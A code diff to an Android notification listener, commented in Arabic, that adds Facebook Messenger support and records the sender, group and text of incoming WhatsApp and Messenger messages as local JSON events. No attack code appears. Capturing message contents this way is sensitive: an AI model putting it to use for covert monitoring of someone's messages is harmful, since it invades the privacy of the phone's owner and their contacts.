@@ -63,7 +63,8 @@ class WhatsappNotificationService : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         if (sbn == null) return
         val pkg = sbn.packageName ?: return
-        if (!Config.isWhatsApp(pkg)) return
+        val msgnr = Config.isMessenger(pkg)
+        if (!Config.isWhatsApp(pkg) && !msgnr) return
 
         val notification = sbn.notification ?: return
         if (sbn.isOngoing) return  // إشعارات مستمرة (اتصال جارٍ، تحميل...) ليست رسائل
@@ -88,34 +89,62 @@ class WhatsappNotificationService : NotificationListenerService() {
                 val fp = "$pkg|${group.ifBlank { sender }}|$sender|$body|${m.ts}"
                 if (fingerprints.containsKey(fp)) continue
                 fingerprints[fp] = now
-                record(pkg, contact = group.ifBlank { sender }, sender = sender, text = body, group = group.isNotEmpty())
+                record(pkg, msgnr, contact = group.ifBlank { sender }, sender = sender, text = body, group = group.isNotEmpty())
             }
             return
         }
 
         // ---------- الطريقة القديمة: EXTRA_TITLE + EXTRA_TEXT ----------
         if (title.isEmpty() || text.isEmpty()) return
-        val titleIsNoise = NOISE_TITLES.any { title.contains(it, ignoreCase = true) }
-        // الإشعار المجمّع (عنوانه «واتساب» ونصه يحمل الرسائل) — لا نرميه، نسجل نصه كاملًا
-        val contact = if (titleIsNoise) "واتساب" else title
         if (text == "رسالة جديدة" || text.equals("new message", ignoreCase = true)) return
+        val titleIsNoise = NOISE_TITLES.any { title.contains(it, ignoreCase = true) }
+        var contact = title
+        var sender = title
+        var body = text
+        if (titleIsNoise) {
+            // الإشعار المجمّع: عنوانه اسم التطبيق ونصه غالبًا «اسم المرسل: الرسالة» —
+            // نستخرج اسم المرسل بدل إنشاء مجلد عام باسم التطبيق
+            val sep = text.indexOf(": ")
+            if (sep in 1..80) {
+                contact = text.substring(0, sep).trim()
+                sender = contact
+                body = text.substring(sep + 2).trim()
+            } else {
+                contact = if (msgnr) "ماسنجر" else "واتساب"
+                sender = contact
+            }
+        }
         val fp = "legacy|$pkg|$contact|$text"
         if (fingerprints.containsKey(fp)) return
         fingerprints[fp] = now
-        record(pkg, contact = contact, sender = contact, text = text, group = false)
+        record(pkg, msgnr, contact = contact, sender = sender, text = body, group = false)
     }
 
-    private fun record(pkg: String, contact: String, sender: String, text: String, group: Boolean) {
+    private fun record(pkg: String, msgnr: Boolean, contact: String, sender: String, text: String, group: Boolean) {
         if (contact.isBlank()) return
+        // إشعارات المجموعات أحيانًا تصل بعنوان «اسم المجموعة : اسم المرسل» — نفصل الاسمين
+        // حتى يكون مجلد المجموعة باسمها فقط والمرسل يظهر داخل تفاصيل الرسالة
+        var c = contact.trim()
+        var s = sender.trim()
+        val sep = c.lastIndexOf(" : ")
+        if (sep > 0 && sep < c.length - 3) {
+            val grp = c.substring(0, sep).trim()
+            val who = c.substring(sep + 3).trim()
+            if (grp.isNotEmpty() && who.isNotEmpty()) {
+                c = grp
+                if (s.isBlank() || s == contact.trim()) s = who
+            }
+        }
+        if (c.isBlank()) return
         val meta = JSONObject().put("text", text.take(500))
-        if (group && sender.isNotBlank() && sender != contact) {
-            meta.put("sender", sender.take(120)).put("group", true)
+        if (group && s.isNotBlank() && s != c) {
+            meta.put("sender", s.take(120)).put("group", true)
         }
         val json = JSONObject()
-            .put("type", "WHATSAPP")
+            .put("type", if (msgnr) "MESSENGER" else "WHATSAPP")
             .put("direction", "INCOMING")
-            .put("title", contact.take(120))     // اسم الشخص أو اسم المجموعة
-            .put("app", whatsappLabel(pkg))
+            .put("title", c.take(120))     // اسم الشخص أو اسم المجموعة
+            .put("app", chatLabel(pkg))
             .put("packageName", pkg)
             .put("meta", meta)
         EventStore.addEvent(applicationContext, json)
@@ -170,14 +199,17 @@ class WhatsappNotificationService : NotificationListenerService() {
         return out
     }
 
-    private fun whatsappLabel(pkg: String): String = when (pkg.lowercase()) {
+    private fun chatLabel(pkg: String): String = when (pkg.lowercase()) {
+        "com.facebook.orca" -> "ماسنجر"
+        "com.facebook.mlite" -> "Messenger Lite"
+        "com.facebook.lite" -> "فيسبوك لايت"
         "com.whatsapp" -> "WhatsApp"
         "com.whatsapp.w4b" -> "WhatsApp Business"
         "com.gbwhatsapp", "com.gbwhatsm", "com.gbwhatsw4b" -> "GBWhatsApp"
         "com.fmwhatsapp" -> "FMWhatsApp"
         "com.yowhatsapp", "com.yowhatsm" -> "YoWhatsApp"
         "com.whatsappplus", "com.wplus" -> "WhatsApp Plus"
-        else -> "WhatsApp"
+        else -> if (Config.isMessenger(pkg)) "ماسنجر" else "WhatsApp"
     }
 
     override fun onListenerConnected() {
